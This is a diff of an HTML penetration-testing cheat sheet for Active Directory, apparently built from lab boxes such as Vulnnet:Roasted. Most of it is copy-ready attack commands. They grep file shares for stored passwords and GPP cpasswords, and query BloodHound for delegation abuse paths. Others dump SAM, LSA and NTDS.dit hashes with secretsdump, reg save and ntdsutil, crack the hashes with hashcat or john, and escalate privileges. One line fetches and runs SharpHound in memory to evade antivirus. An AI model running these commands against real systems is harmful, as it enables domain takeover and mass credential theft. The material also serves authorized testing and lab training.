+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">step 3 — grep aggressively across local copies</span><div class="cb-tags"><span class="tag t-crit">the win</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Greps for every cred-leak pattern across all pulled share content. Different patterns surface different leak types — run all of them. The <code>user:pass</code> style and hardcoded variable assignments are the most common hits.</div>
+<pre><span class="c"># Universal cred search:</span>
+grep -riE 'password|pwd|secret|cred|key|token|api[_-]?key' shares/ 2&gt;/dev/null
+
+<span class="c"># Variable-assignment style (a-whitehat = "..." or Set strPassword = "..."):</span>
+grep -rE '^\s*(password|pwd|pass|user|username|secret|key|token)\s*[:=]\s*[''"]\S+[''"]' shares/ -i 2&gt;/dev/null
+
+<span class="c"># user:pass format (sometimes in config files):</span>
+grep -rEo '\S+:\S{6,}' shares/ 2&gt;/dev/null | grep -v ':$'
+
+<span class="c"># Base64 blobs (lazy encoding):</span>
+grep -rE '^[A-Za-z0-9+/]{20,}={0,2}$' shares/ 2&gt;/dev/null
+
+<span class="c"># GPP cpasswords:</span>
+grep -r "cpassword=" shares/ 2&gt;/dev/null
+
+<span class="c"># Connection strings (web.config, app.config):</span>
+grep -riE 'connectionstring|connstr|database\s*=|server\s*=.*pwd' shares/ 2&gt;/dev/null
+
+<span class="c"># Script files specifically (most common cred container):</span>
+find shares/ -type f \( -name "*.vbs" -o -name "*.ps1" -o -name "*.bat" -o -name "*.cmd" -o -name "*.sh" \) | \
+  xargs grep -lE 'password|pwd|secret' 2&gt;/dev/null
+
+<span class="c"># Office docs (sometimes embedded creds in metadata):</span>
+find shares/ -type f \( -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" \)
+<span class="c"># Then strings | grep on each</span></pre></div>
+
+<div class="sig">
+<span class="sig-title">script file cred patterns to recognize</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">.vbs:</span> <code>strPassword = "..."</code> or <code>Set objUser.Password = "..."</code></span>
+<span class="sig-note">Old VBScript admin scripts. Very common Vulnnet pattern. Domain creds frequently hardcoded.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">.ps1:</span> <code>$pass = "..."</code> or <code>ConvertTo-SecureString "..."</code></span>
+<span class="sig-note">PowerShell scripts running scheduled tasks. Service account creds inline.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">.bat / .cmd:</span> <code>net use \\host /user:DOMAIN\admin "..."</code> or <code>runas /user:admin</code></span>
+<span class="sig-note">Logon scripts, mapped drive setups. Sometimes encrypted with /SAVECRED but often plaintext.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">.xml / .config:</span> <code>&lt;password&gt;...&lt;/password&gt;</code> or <code>connectionString="...Password=..."</code></span>
+<span class="sig-note">App.config, web.config, custom XML configs. Database creds and service principal passwords here.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">.ini:</span> <code>password=...</code> or <code>[Credentials]</code> section</span>
+<span class="sig-note">Older app configs. Sometimes encoded but often plaintext.</span>
+</div>
+</div>
+
+<div class="moveon">
+<span class="moveon-title">move on when</span>
+<span class="moveon-item">Every non-default share pulled and grep'd → no hits</span>
+<span class="moveon-item">Found a cred → validate with nxc → re-enumerate as new user (BloodHound visibility may change)</span>
+<span class="moveon-item">Found admin cred → straight to Hash Extraction section</span>
+</div>
+</div>
+</details>
+
 <details class="sec-detail" id="ldap-mining">
 <summary>🔍 LDAP Attribute Mining — Find Creds in Non-Default Fields<span class="order-tag tag-ref" style="margin-right:1rem;">REFERENCE</span></summary>
 <div class="sec-body">
@@ -2556,16 +2750,13 @@ impacket-psexec -k -no-pass dc01.corp.local
 impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP
 
 <span class="c"># Unconstrained — BloodHound (excludes DCs which are default-true):</span>
-MATCH (c:Computer {unconstraineddelegation:true})
-WHERE NOT (c)-[:MemberOf]->(:Group {name:"DOMAIN CONTROLLERS@$REALM"})
-RETURN c.name
+MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT (c)-[:MemberOf]-&gt;(:Group {name:"DOMAIN CONTROLLERS@$REALM"}) RETURN c
 
 <span class="c"># Constrained — BloodHound (AllowedToDelegate edge):</span>
-MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN u.name, c.name
+MATCH p=(u)-[:AllowedToDelegate]-&gt;(c) RETURN p
 
 <span class="c"># RBCD-able — BloodHound (write access on a Computer object):</span>
-MATCH p=(u)-[:GenericAll|GenericWrite|WriteDACL|WriteOwner|AddAllowedToAct]->(c:Computer)
-RETURN p</pre></div>
+MATCH p=(u)-[:GenericAll|GenericWrite|WriteDACL|WriteOwner|AddAllowedToAct]-&gt;(c:Computer) RETURN p</pre></div>
 
 <h3 style="margin:1.2rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">⭐ Type 3 — RBCD (Resource-Based Constrained Delegation)</h3>
 <div class="cb"><div class="cb-head"><span class="cb-lbl">USE WHEN: GenericAll/Write/WriteDACL on a Computer object</span><div class="cb-tags"><span class="tag t-crit">most common path</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
@@ -2697,9 +2888,7 @@ impacket-rbcd "$DOMAIN/$USER:$PASS" \
 impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP | grep -v "Domain Controllers"
 
 <span class="c"># BloodHound (excluding DCs which are normal):</span>
-MATCH (c:Computer {unconstraineddelegation:true})
-WHERE NOT (c)-[:MemberOf]->(:Group {name:"DOMAIN CONTROLLERS@$REALM"})
-RETURN c.name
+MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT (c)-[:MemberOf]-&gt;(:Group {name:"DOMAIN CONTROLLERS@$REALM"}) RETURN c
 
 <span class="c"># EXPLOIT — Option A: wait for DA to naturally authenticate</span>
 <span class="c"># Get shell on the unconstrained machine first, then monitor:</span>
@@ -2729,7 +2918,7 @@ python3 printerbug.py $DOMAIN/$USER:"$PASS"@$DC_IP $UNCON_IP
 impacket-findDelegation $DOMAIN/$USER:"$PASS" -dc-ip $DC_IP | grep "Constrained"
 
 <span class="c"># BloodHound:</span>
-MATCH p=(u)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name
+MATCH p=(u)-[:AllowedToDelegate]-&gt;(c:Computer) RETURN p
 
 <span class="c"># EXPLOIT — Request ticket impersonating Administrator to allowed service:</span>
 impacket-getST -spn "cifs/$TARGET_FQDN" \
@@ -2906,7 +3095,7 @@ MATCH p=(o {owned:true})-[:GenericAll|GenericWrite|WriteDACL|WriteOwner|ForceCha
 MATCH p=(o {owned:true})-[:DCSync|GetChanges|GetChangesAll]-&gt;(d:Domain) RETURN p
 
 <span class="c"># 7. Machines with active DA sessions (get local admin → steal TGT):</span>
-MATCH p=(c:Computer)-[:HasSession]-&gt;(u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN p
+MATCH p=(c:Computer)-[:HasSession]-&gt;(u:User)-[:MemberOf*1..]-&gt;(g:Group {name:"DOMAIN ADMINS@$REALM"}) RETURN p
 <span class="c"># Change CORP.LOCAL to your domain name</span></pre></div>
 
       <div class="cb"><div class="cb-head"><span class="cb-lbl">GenericAll on user — reset password</span><button class="cpb" onclick="cp(this)">copy</button></div>
@@ -3402,6 +3591,145 @@ EOF</pre></div>
 </div>
 </details>
 
+<details class="sec-detail" id="winrm-pwnd-warning">
+<summary>⚠️ nxc "Pwn3d!" on WinRM ≠ Local Admin</summary>
+<div class="sec-body">
+<div class="note n-bad"><strong>🐛 Common false positive:</strong> When <code>nxc winrm $IP -u $USER -p "$PASS"</code> returns <code>[+] (Pwn3d!)</code>, it ONLY confirms WinRM authentication succeeded. It does NOT confirm local admin rights. <strong>Real friction from Vulnnet:Roasted — Pwn3d! returned but the account was only in <code>Remote Management Users</code> group with 3 privileges, blocking SAM dump and registry reads.</strong></div>
+
+<table class="qref-table">
+<thead><tr><th style="width:35%">Group / Privilege</th><th style="width:30%">WinRM access?</th><th style="width:35%">Local admin?</th></tr></thead>
+<tbody>
+<tr><td><code>BUILTIN\Administrators</code></td><td>✅ Yes</td><td>✅ Yes (full)</td></tr>
+<tr><td><code>BUILTIN\Remote Management Users</code></td><td>✅ Yes</td><td>❌ No — read-only access to most things</td></tr>
+<tr><td>WinRM custom ACL grant</td><td>✅ Yes (limited)</td><td>❌ No</td></tr>
+<tr><td><code>BUILTIN\Remote Desktop Users</code></td><td>❌ (RDP only, port 3389)</td><td>❌ No</td></tr>
+</tbody>
+</table>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">verify what you actually have</span><div class="cb-tags"><span class="tag t-crit">always run after Pwn3d!</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Confirms whether you have real local admin rights after a Pwn3d! result. Real admin shows 15-20 privileges. Remote Management Users shows 3.</div>
+<pre><span class="c"># In your WinRM shell — count privileges:</span>
+whoami /priv
+
+<span class="c"># Real local admin output (~15-20 privileges, lots of Se* enabled):</span>
+<span class="c">#   SeIncreaseQuotaPrivilege, SeSecurityPrivilege, SeTakeOwnershipPrivilege,</span>
+<span class="c">#   SeLoadDriverPrivilege, SeSystemProfilePrivilege, SeSystemtimePrivilege,</span>
+<span class="c">#   SeProfileSingleProcessPrivilege, SeIncreaseBasePriorityPrivilege,</span>
+<span class="c">#   SeCreatePagefilePrivilege, SeBackupPrivilege, SeRestorePrivilege,</span>
+<span class="c">#   SeShutdownPrivilege, SeDebugPrivilege, SeSystemEnvironmentPrivilege, ...</span>
+
+<span class="c"># Remote Management Users only (3 privileges):</span>
+<span class="c">#   SeMachineAccountPrivilege, SeChangeNotifyPrivilege, SeIncreaseWorkingSetPrivilege</span>
+
+<span class="c"># Direct group check:</span>
+whoami /groups | findstr -i admin
+net localgroup administrators
+
+<span class="c"># Quick "am I real admin?" one-liner:</span>
+[bool](([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole("Administrators"))</pre></div>
+
+<div class="sig">
+<span class="sig-title">action by privilege count</span>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">15+ privileges enabled</span></span>
+<span class="sig-note">Real local admin. Proceed to Hash Extraction section. SAM/LSA/registry dumps all work.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">3-5 privileges enabled</span></span>
+<span class="sig-note">Remote Management Users only. NO direct admin access. Need local privesc OR pivot to another box. Look for: cmdkey /list, stored credentials, scheduled tasks, weak service permissions, AlwaysInstallElevated, accessible non-default folders.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">SeImpersonatePrivilege present (even with few others)</span></span>
+<span class="sig-note">Privesc to SYSTEM via PrintSpoofer or GodPotato. Service accounts often have this.</span>
+</div>
+<div class="sig-entry">
+<span class="sig-signal"><span class="sig-label">SeBackupPrivilege present (even with few others)</span></span>
+<span class="sig-note">Can read SAM/SYSTEM hives without admin via reg save → offline parse. Common on backup operator accounts.</span>
+</div>
+</div>
+</div>
+</details>
+
+<details class="sec-detail" id="hashcat-wsl">
+<summary>🔧 Hashcat on WSL — GPU via Windows Host</summary>
+<div class="sec-body">
+<div class="note n-bad"><strong>🐛 Common error:</strong> <code>clGetPlatformIDs(): CL_PLATFORM_NOT_FOUND_KHR</code> — hashcat v7+ refuses to crack without an OpenCL/CUDA runtime, and WSL doesn't get GPU passthrough by default. Adding <code>--force</code> doesn't help.</div>
+<div class="note n-warn"><strong>PoCL is no longer in Kali repos</strong> — <code>apt install pocl-opencl-icd</code> returns "Package has no installation candidate". Don't waste time on it.</div>
+
+<h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">✅ Recommended fix — use hashcat.exe on Windows host</h3>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">one-time setup — Windows hashcat callable from WSL</span><div class="cb-tags"><span class="tag t-crit">setup once, GPU forever</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Installs hashcat on the Windows host (which has working GPU drivers) and creates a WSL function that calls it transparently. From WSL you type <code>hashcat</code> and it runs on your GPU.</div>
+<pre><span class="c"># 1. On Windows side — download &amp; extract:</span>
+<span class="c">#    https://hashcat.net/files/hashcat-7.1.2.7z → C:\hashcat\</span>
+
+<span class="c"># 2. In WSL — verify .bashrc is clean first:</span>
+sed -i '/alias hashcat=/d' ~/.bashrc
+sed -i '/^hashcat()/,/^}/d' ~/.bashrc
+bash -n ~/.bashrc &amp;&amp; echo "✓ bashrc OK"
+
+<span class="c"># 3. Add the function (NOT an alias — alias breaks with cd):</span>
+cat &gt;&gt; ~/.bashrc &lt;&lt;'BASHRC_END'
+
+<span class="c"># Run Windows hashcat from WSL with proper cwd + path conversion</span>
+hashcat() {
+    local HASHCAT_DIR="/mnt/c/hashcat"
+    local args=()
+    for arg in "$@"; do
+        if [[ -f "$arg" || -d "$arg" ]]; then
+            args+=("$(wslpath -w "$arg")")
+        else
+            args+=("$arg")
+        fi
+    done
+    (cd "$HASHCAT_DIR" &amp;&amp; ./hashcat.exe "${args[@]}")
+}
+BASHRC_END
+
+<span class="c"># 4. Test:</span>
+source ~/.bashrc
+type hashcat              <span class="c"># should say "hashcat is a function"</span>
+hashcat --version         <span class="c"># v7.1.2</span>
+hashcat -I                <span class="c"># lists your GPU (RTX, etc.)</span>
+
+<span class="c"># 5. Use it — handles WSL paths automatically:</span>
+hashcat -m 18200 ~/loot/asrep.hashes /usr/share/wordlists/rockyou.txt</pre></div>
+
+<div class="note n-warn"><strong>Why cd matters:</strong> Windows hashcat looks for <code>./OpenCL/</code> relative to current directory. Without <code>cd /mnt/c/hashcat</code> first, you get <code>./OpenCL/: No such file or directory</code>. The function above handles this automatically. An alias with <code>cd</code> inline doesn't work — must be a function so path arg expansion happens correctly.</div>
+
+<h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">🟨 Fallback — john on CPU (no GPU needed)</h3>
+<div class="cb"><div class="cb-head"><span class="cb-lbl">john works without GPU drivers</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> john auto-detects hash format and runs on CPU. Slower than GPU but works anywhere. Use as fallback when hashcat setup is being a pain.</div>
+<pre><span class="c"># AS-REP hash (john format: krb5asrep):</span>
+john --wordlist=/usr/share/wordlists/rockyou.txt loot/asrep.hashes
+
+<span class="c"># Kerberoast hash (john format: krb5tgs):</span>
+john --wordlist=/usr/share/wordlists/rockyou.txt loot/kerberoast.hashes
+
+<span class="c"># NTLMv2 / NTLMv1 (auto-detects):</span>
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+<span class="c"># Show cracked passwords:</span>
+john --show loot/asrep.hashes</pre></div>
+
+<h3 style="margin:1rem 0 0.5rem;font-size:0.95rem;color:#58a6ff;">📋 Hashcat mode quick-reference</h3>
+<table class="qref-table">
+<thead><tr><th style="width:15%">Mode</th><th style="width:30%">What</th><th style="width:55%">Source</th></tr></thead>
+<tbody>
+<tr><td><code>1000</code></td><td>NTLM (NT hash)</td><td>secretsdump output 4th column (<code>user:RID:lm:NT:::</code>)</td></tr>
+<tr><td><code>5500</code></td><td>NetNTLMv1</td><td>Older Responder/relay captures (rare on modern AD)</td></tr>
+<tr><td><code>5600</code></td><td>NetNTLMv2</td><td>Hash capture format <code>user::DOMAIN:nonce:hash:hash</code> (Responder logs etc.)</td></tr>
+<tr><td><code>13100</code></td><td>Kerberos TGS</td><td>Kerberoast output — <code>$krb5tgs$23$*</code> prefix</td></tr>
+<tr><td><code>18200</code></td><td>Kerberos AS-REP</td><td>AS-REP roast output — <code>$krb5asrep$23$</code> prefix</td></tr>
+<tr><td><code>2100</code></td><td>DCC2 / MS Cache 2</td><td>Cached domain creds (secretsdump's "Dumping cached" section)</td></tr>
+<tr><td><code>1500</code></td><td>DES (crypt)</td><td>Old Unix /etc/passwd entries</td></tr>
+<tr><td><code>1800</code></td><td>SHA512 (crypt)</td><td>Modern Linux /etc/shadow</td></tr>
+</tbody>
+</table>
+
+</div>
+</details>
+
 <details class="sec-detail" id="tool-errors">
 <summary><span class="order-tag tag-ref">REFERENCE</span>🛠️ Tool Errors — Common Failures &amp; Fixes<span class="tag t-crit" style="margin-left:auto;margin-right:1rem;">reference</span></summary>
 <div class="sec-body">
@@ -3462,13 +3790,13 @@ EOF</pre></div>
 <tr><td><code>No data in graph after import</code></td><td>Zip not selected in BloodHound UI OR Neo4j not running</td><td>Drag .zip into BloodHound. Verify <code>sudo neo4j status</code>.</td></tr>
 <tr><td><code>"Database is not available"</code></td><td>Neo4j service stopped</td><td><code>sudo neo4j start</code>. Default creds: neo4j/neo4j (then change).</td></tr>
 <tr><td><code>SharpHound collected 0 users</code></td><td>Wrong collection method or LDAP filter blocking</td><td>Use <code>-c All</code>. Check user has read access to domain.</td></tr>
-<tr><td><code>Cypher query returns no results when path should exist</code></td><td>Domain name capitalization wrong in query</td><td>Use uppercase: <code>"DOMAIN ADMINS@CORP.LOCAL"</code></td></tr>
+<tr><td><code>Cypher query returns no results when path should exist</code></td><td>Domain name capitalization wrong in query</td><td>Use uppercase: <code>"DOMAIN ADMINS@$REALM"</code></td></tr>
 <tr><td><code>bloodhound-python hangs at "Done in"</code></td><td>DNS resolution slow</td><td>Add <code>-ns $DC_IP</code> or use <code>--dns-tcp</code>.</td></tr>
 <tr><td><code>SharpHound.exe blocked by AV</code></td><td>Defender flags it (very common)</td><td>Use bloodhound-python from kali, or in-memory: <code>IEX(IWR -UseBasicParsing http://.../SharpHound.ps1)</code></td></tr>
 <tr><td><code>dns.resolver.LifetimeTimeout</code></td><td>System resolver can't resolve internal AD domain (WSL/VM DNS)</td><td>Add <code>-ns $DC_IP</code> flag. Add <code>--dns-tcp</code> if still slow.</td></tr>
 <tr><td><code>specified domain controller looks like an IP, but requires a hostname</code></td><td><code>-dc</code> needs FQDN, not IP</td><td>Use <code>-dc $DC_HOST</code> (FQDN). <code>-ns $DC_IP</code> is for the DNS server (IP is fine there).</td></tr>
 <tr><td>"An error occurred when adding node" (CE)</td><td>UI glitch during ingest — data IS in graph</td><td>Hard-refresh (Ctrl+Shift+R). Or use Cypher tab directly: <code>MATCH (u:User) WHERE u.name CONTAINS "..." RETURN u</code></td></tr>
-<tr><td>Mark as Owned right-click fails</td><td>Known BloodHound UI bug</td><td>Use Cypher: <code>MATCH (u:User {name:"USER@REALM"}) SET u.owned=true RETURN u</code></td></tr>
+<tr><td>Mark as Owned right-click fails (Legacy only)</td><td>Known BloodHound Legacy UI bug</td><td><strong>Legacy:</strong> <code>MATCH (u:User {name:"USER@REALM"}) SET u.owned=true RETURN u</code><br><strong>CE:</strong> SET is blocked. Use right-click "Mark User as Owned" in UI — it works reliably in CE.</td></tr>
 <tr><td>BloodHound CE setup: browser fails to launch as root</td><td>Chromium sandbox restriction</td><td>Services ARE running. Manually open <code>http://localhost:7474</code> in your browser. Set neo4j password, edit <code>/etc/bhapi/bhapi.json</code>, then <code>sudo bloodhound-start</code> + open <code>http://localhost:8080</code>.</td></tr>
 <tr><td>BloodHound CE "Database is not available"</td><td>Neo4j stopped or bhapi.json password mismatch</td><td><code>sudo neo4j start</code>. Verify <code>/etc/bhapi/bhapi.json</code> has correct neo4j password.</td></tr>
 <tr><td>"No path to DA" in shortest-path</td><td>BloodHound only sees AD object relationships</td><td>Not a dead end. Switch to: SMB share content, SYSVOL grep, Kerberoast unfiltered, password reuse spray. BH can't see file-stored creds.</td></tr>
@@ -3711,6 +4039,141 @@ route print
       </div>
 </div>
 </details>
+<details class="sec-detail" id="hash-extraction">
+<summary>💰 Hash Extraction — SAM / LSA / NTDS</summary>
+<div class="sec-body">
+<div class="note n-good">After getting local admin OR domain admin on the DC, dump everything. Different methods for different access levels. Friction from Vulnnet:Roasted: DRSUAPI replication right ≠ local admin — they're separate ACL gates. Local admin on the DC can still read NTDS via VSS or registry, but DCSync (DRSUAPI) needs Replicating Directory Changes rights.</div>
+
+<table class="qref-table">
+<thead><tr><th style="width:30%">Access level</th><th style="width:35%">What you can dump</th><th style="width:35%">Method</th></tr></thead>
+<tbody>
+<tr><td>Domain creds (DCSync rights)</td><td>NTDS.dit (every domain hash)</td><td><code>secretsdump -just-dc-ntlm</code> (DRSUAPI)</td></tr>
+<tr><td>Local admin on DC (no DCSync)</td><td>NTDS via VSS shadow copy</td><td><code>secretsdump -use-vss</code></td></tr>
+<tr><td>Local admin on any box</td><td>Local SAM + LSA + cached creds</td><td><code>secretsdump LOCAL</code> or <code>nxc --sam --lsa</code></td></tr>
+<tr><td>Shell as local admin (no SMB)</td><td>SAM/SYSTEM/SECURITY hives</td><td><code>reg save</code> + download + parse offline</td></tr>
+<tr><td>Shell on DC as DA</td><td>NTDS via ntdsutil snapshot</td><td><code>ntdsutil "ac i ntds" "ifm" "create full ..."</code></td></tr>
+</tbody>
+</table>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">method 1 — DCSync from Kali (cleanest)</span><div class="cb-tags"><span class="tag t-crit">use first</span></div><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> If your account has DCSync rights (Domain Admin, Enterprise Admin, or explicit Replicating Directory Changes ACE), pull every domain hash via the DRSUAPI replication protocol. No shell required — runs entirely from Kali.</div>
+<pre><span class="c"># Full dump — every user hash + machine accounts + krbtgt:</span>
+impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -just-dc-ntlm \
+  -outputfile loot/dcsync
+
+<span class="c"># With NT hash instead of password:</span>
+impacket-secretsdump "$DOMAIN/$USER"@$DC_IP -hashes ":$HASH" \
+  -just-dc-ntlm -outputfile loot/dcsync
+
+<span class="c"># nxc shortcut (same result, simpler syntax):</span>
+nxc smb $DC_IP -u "$USER" -p "$PASS" --ntds \
+  | tee loot/ntds-nxc.txt</pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">method 2 — VSS fallback (local admin, no DCSync)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> When you're local admin on the DC but DON'T have DCSync rights (DRSUAPI fails with <code>rpc_s_access_denied</code> or <code>ERROR_DS_DRA_BAD_DN</code>), this creates a Volume Shadow Copy, reads NTDS.dit out of it, parses offline. Works because local admin can VSS even without replication rights.</div>
+<pre><span class="c"># Full domain dump via VSS:</span>
+impacket-secretsdump "$DOMAIN/$USER:$PASS"@$DC_IP -use-vss \
+  -just-dc-ntlm -outputfile loot/vss
+
+<span class="c"># If you saw these errors with the default DRSUAPI method,</span>
+<span class="c"># -use-vss is your answer:</span>
+<span class="c">#   "RemoteOperations failed: rpc_s_access_denied"</span>
+<span class="c">#   "DRSR SessionError: ERROR_DS_DRA_BAD_DN"</span></pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">method 3 — local SAM dump (any local admin)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Dumps the LOCAL SAM database (machine-local accounts, not domain). LSA secrets include $MACHINE.ACC (machine account hash) and cached domain logon hashes. Useful for lateral movement to other boxes where these local hashes may be reused.</div>
+<pre><span class="c"># From Kali — full local hash extraction:</span>
+impacket-secretsdump "$DOMAIN/$USER:$PASS"@$IP \
+  -outputfile loot/local-$IP
+
+<span class="c"># Output includes:</span>
+<span class="c">#  - Local SAM hashes (Administrator, Guest, DefaultAccount, ...)</span>
+<span class="c">#  - LSA secrets ($MACHINE.ACC = machine account hash)</span>
+<span class="c">#  - Cached domain credentials (DCC2 — crackable with hashcat -m 2100)</span>
+
+<span class="c"># nxc shortcuts:</span>
+nxc smb $IP -u "$USER" -p "$PASS" --sam     <span class="c"># just SAM</span>
+nxc smb $IP -u "$USER" -p "$PASS" --lsa     <span class="c"># LSA secrets only</span>
+nxc smb $IP -u "$USER" -p "$PASS" --ntds    <span class="c"># NTDS (DC only)</span></pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">method 4 — reg save + offline parse (no SMB exec)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> When secretsdump's remote service starts are blocked (RemoteRegistry stopped + can't be started) and you have a shell, manually save the registry hives and parse them offline. Standard fallback.</div>
+<pre><span class="c"># In your shell on target (evil-winrm, RDP, etc.):</span>
+mkdir C:\Temp 2&gt;$null
+reg save HKLM\SAM C:\Temp\SAM.save
+reg save HKLM\SYSTEM C:\Temp\SYSTEM.save
+reg save HKLM\SECURITY C:\Temp\SECURITY.save
+
+<span class="c"># Download via evil-winrm:</span>
+<span class="c">#   download C:\Temp\SAM.save /tmp/SAM</span>
+<span class="c">#   download C:\Temp\SYSTEM.save /tmp/SYSTEM</span>
+<span class="c">#   download C:\Temp\SECURITY.save /tmp/SECURITY</span>
+
+<span class="c"># Or via smbclient (if C$ readable):</span>
+smbclient //$IP/C$ -U "$DOMAIN/$USER%$PASS" \
+  -c "cd Temp; get SAM.save; get SYSTEM.save; get SECURITY.save"
+
+<span class="c"># Parse offline:</span>
+impacket-secretsdump -sam /tmp/SAM -system /tmp/SYSTEM \
+  -security /tmp/SECURITY LOCAL
+
+<span class="c"># Clean up on target:</span>
+<span class="c">#   del C:\Temp\SAM.save C:\Temp\SYSTEM.save C:\Temp\SECURITY.save</span></pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">method 5 — ntdsutil IFM snapshot (shell as DA on DC)</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Native Windows command to snapshot the AD database. Only works as Domain Admin (or equivalent) on a DC. The "install from media" feature creates a clean copy of NTDS.dit + the SYSTEM hive needed to decrypt it.</div>
+<pre><span class="c"># In shell on DC as DA:</span>
+ntdsutil "ac i ntds" "ifm" "create full C:\Temp\ntds" q q
+
+<span class="c"># Files created:</span>
+<span class="c">#  C:\Temp\ntds\Active Directory\ntds.dit</span>
+<span class="c">#  C:\Temp\ntds\registry\SYSTEM</span>
+<span class="c">#  C:\Temp\ntds\registry\SECURITY</span>
+
+<span class="c"># Download:</span>
+smbclient //$IP/C$ -U "$DOMAIN/$USER%$PASS" \
+  -c 'cd "Temp\ntds\Active Directory"; get ntds.dit'
+smbclient //$IP/C$ -U "$DOMAIN/$USER%$PASS" \
+  -c 'cd Temp\ntds\registry; get SYSTEM'
+
+<span class="c"># Parse offline:</span>
+impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+
+<span class="c"># Clean up:</span>
+<span class="c">#   rmdir /s /q C:\Temp\ntds</span></pre></div>
+
+<div class="cb"><div class="cb-head"><span class="cb-lbl">troubleshooting — secretsdump errors</span><button class="cpb" onclick="cp(this)">copy</button></div>
+<div class="cb-desc"><strong>What this does:</strong> Maps every common secretsdump error to its actual fix.</div>
+<pre><span class="c"># ERROR: "rpc_s_access_denied" + "ERROR_DS_DRA_BAD_DN"</span>
+<span class="c">#   CAUSE: Account lacks DCSync rights (just local admin, not DA)</span>
+<span class="c">#   FIX:   Add -use-vss flag (VSS shadow copy method)</span>
+
+<span class="c"># ERROR: "Service RemoteRegistry is in stopped state" then HANGS</span>
+<span class="c">#   CAUSE: Service start attempted but slow / blocked</span>
+<span class="c">#   FIX:   Wait 2-3 min. If truly stuck, use -just-dc instead of full dump</span>
+
+<span class="c"># ERROR: "KeyError: 'Cryptodome.Cipher.AES'"</span>
+<span class="c">#   CAUSE: Mixed pycryptodome / pycryptodomex install</span>
+<span class="c">#   FIX:   sudo apt install python3-pycryptodome</span>
+<span class="c">#          Or: pip3 install --upgrade pycryptodomex --break-system-packages</span>
+
+<span class="c"># ERROR: "STATUS_LOGON_FAILURE" with creds that work elsewhere</span>
+<span class="c">#   CAUSE: Domain not specified or wrong format</span>
+<span class="c">#   FIX:   Use $DOMAIN/$USER:PASS@$IP (not $USER:PASS@$IP)</span>
+
+<span class="c"># ERROR: "STATUS_USER_SESSION_DELETED" partway through</span>
+<span class="c">#   CAUSE: Target box slow / SMB session timeout</span>
+<span class="c">#   FIX:   Re-run with -outputfile so partial results save</span></pre></div>
+
+<div class="moveon">
+<span class="moveon-title">move on when</span>
+<span class="moveon-item">You have NTDS dump (every domain hash including krbtgt) — game over for the domain</span>
+<span class="moveon-item">Or local SAM dump confirms local admin elsewhere via PtH</span>
+<span class="moveon-item">If all methods fail → you're not actually admin on the target. Re-check whoami /priv.</span>
+</div>
+</div>
+</details>
+
 <details class="sec-detail" id="dcsync">
 <summary><span class="order-tag tag-goal">GOAL</span>💀 DCSync + Proof<span class="tag t-crit" style="margin-left:auto;margin-right:1rem;">finish</span></summary>
 <div class="sec-body">
